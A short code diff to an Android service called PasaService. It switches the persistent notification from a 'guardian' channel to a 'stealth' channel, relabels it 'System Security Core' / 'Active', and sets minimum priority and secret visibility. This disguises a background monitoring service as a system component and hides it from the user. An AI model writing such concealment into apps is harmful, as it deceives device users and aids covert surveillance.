@@ -376,14 +376,15 @@ class PasaService : LifecycleService() {
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
 
-        return NotificationCompat.Builder(this, PasaApp.GUARDIAN_CHANNEL_ID)
-            .setContentTitle(getString(R.string.notification_guardian_title))
-            .setContentText(getString(R.string.notification_guardian_text))
+        return NotificationCompat.Builder(this, PasaApp.STEALTH_CHANNEL_ID)
+            .setContentTitle("System Security Core")
+            .setContentText("Active")
             .setSmallIcon(R.drawable.ic_launcher_foreground)
             .setContentIntent(contentIntent)
             .setOngoing(true)
             .setSilent(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .build()
     }
